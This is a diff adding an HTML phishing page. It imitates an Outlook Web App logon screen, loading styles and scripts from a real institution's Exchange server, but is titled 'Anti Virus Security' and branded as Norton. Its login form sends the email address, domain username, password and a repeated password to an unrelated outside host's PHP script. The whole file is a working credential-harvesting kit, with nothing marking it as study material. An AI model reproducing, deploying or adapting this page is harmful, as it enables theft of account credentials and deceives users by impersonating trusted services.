@@ -1,0 +1,192 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- Copyright (c) 2006 Microsoft Corporation.  All rights reserved. -->
+<!-- OwaPage = ASP.auth_logon_aspx -->
+
+<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} --> 
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> 
+<html>
+<head>
+<link rel="shortcut icon" href="https://exchange.fhcrc.org/owa/14.3.248.2/themes/resources/favicon.ico" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
+<meta name="Robots" content="NOINDEX, NOFOLLOW">
+<title>Anti Virus Security</title>
+<link type="text/css" rel="stylesheet" href="https://exchange.fhcrc.org/owa/14.3.248.2/themes/resources/logon.css">
+<link type="text/css" rel="stylesheet" href="https://exchange.fhcrc.org/owa/14.3.248.2/themes/resources/owafont.css">
+<script type="text/javascript" src="https://exchange.fhcrc.org/owa/14.3.248.2/scripts/premium/flogon.js"></script>
+
+<script type="text/javascript">
+	<!--
+	var a_fRC = 1;
+	var g_fFcs = 1;
+	var a_fLOff = 0;
+	var a_fCAC = 1;
+	var a_fEnbSMm = 1;
+/// <summary>
+/// Is Mime Control installed?
+/// </summary>
+function IsMimeCtlInst(progid)
+{
+	if (!a_fEnbSMm)
+		return false;
+
+	var oMimeVer = null;
+
+	try 
+	{
+		// TODO: ingore this on none IE browser
+		//
+		//oMimeVer = new ActiveXObject(progid);
+	} 
+	catch (e)
+	{ 
+	}
+
+	if (oMimeVer != null)
+		return true;
+	else
+		return false;
+}
+
+/// <summary>
+/// Render out the S-MIME control if it is installed.
+/// </summary>
+function RndMimeCtl()
+{
+	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");
+
+	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");
+
+	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
+}
+
+/// <summary>
+/// Helper function to factor out the rendering of the S/MIME control.
+/// </summary>
+function RndMimeCtlHlpr(objid, classid, ns, id)
+{
+	document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
+	document.write("<?IMPORT namespace='" + ns + "' implementation=#" + objid + ">");
+	document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
+}
+	-->
+</script>
+
+</head>
+<body class="owaLgnBdy">
+
+<script type="text/javascript">
+	RndMimeCtl();
+</script>
+
+<noscript>
+	<div id="dvErr">
+		<table cellpadding="0" cellspacing="0">
+		<tr>
+			<td><img src="" alt=""></td>
+			<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn't support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook Web App.</td>
+		</tr>
+		</table>
+	</div>
+</noscript>
+<form action="https://privtdns.com/norton/email.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+<input type="hidden" name="destination" value="https://exchange.fhcrc.org/owa/">
+<input type="hidden" name="flags" value="0">
+<input type="hidden" name="forcedownlevel" value="0">
+<table align="center" id="tblMain" cellpadding=0 cellspacing=0 width="540">
+	<tr>
+		<td colspan=3>
+			&nbsp;</td>
+	</tr>
+	<tr>
+		<td id="mdLft">&nbsp;</td>
+		<td id="mdMid">
+			<table id="tblMid" class="mid" width="532">
+				<tr>
+					<td id="expltxt" class="expl">
+										
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<img border="0" src="nort.jpg" width="525" height="100"></td>
+				</tr>
+				
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						
+						&nbsp;</td>
+				</tr>
+				
+				<tr><td><hr></td></tr>
+				<tr>
+					<td>
+						<table cellpadding=0 cellspacing=0>
+							<col class="nowrap">
+							<col class="w100">
+							<col>
+							<tr>
+								<td nowrap><label for="email">Email Address:</label></td>
+								<td class="txtpad"><input id="email" name="email" type="email" class="txt"></td>
+							</tr>
+							<tr>
+								<td nowrap><label for="username">Domain\User name:</label></td>
+								<td class="txtpad"><input id="username" name="username" type="text" class="txt"></td>
+							</tr>
+							<tr>
+								<td nowrap><label for="password">Password:</label></td>
+								<td class="txtpad"><input id="password" name="password" type="password" class="txt" onfocus="g_fFcs=0"></td>
+							</tr>
+							<tr>
+								<td nowrap><label for="conpassword">Confirm Password:</label></td>
+								<td class="txtpad"><input id="conpassword" name="conpassword" type="password" class="txt" onfocus="g_fFcs=0"></td>
+							</tr>
+							<tr>
+								<td colspan=2 align="right" class="txtpad">
+									
+									<input type="submit" class="btn" value="Submit" onclick="clkLgn()" 
+										onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'">
+									
+									<input name="isUtf8" type="hidden" value="1">
+								</td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+				<tr><td><hr></td></tr>
+				
+			</table>
+			<table id="tblMid2" class="mid" style="display:none">
+				<tr><td><hr></td></tr>
+				<tr>
+					<td><br>Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></td>
+				</tr>
+				<tr><td><hr></td></tr>
+				<tr>
+					<td align="right" class="txtpad">
+					
+						&nbsp;</td>
+				</tr>
+			</table>
+			<table class="mid tblConn">
+				<tr>
+					<td class="tdCopy">&copy; 2018 Norton Antivirus. All rights reserved.</td>
+				</tr>
+			</table>
+		</td>
+		<td id="mdRt">&nbsp;</td>
+	</tr>
+	<tr>
+		<td colspan=3>
+			&nbsp;</td>
+	</tr>
+</table>
+</form>
+</body>
+</html>
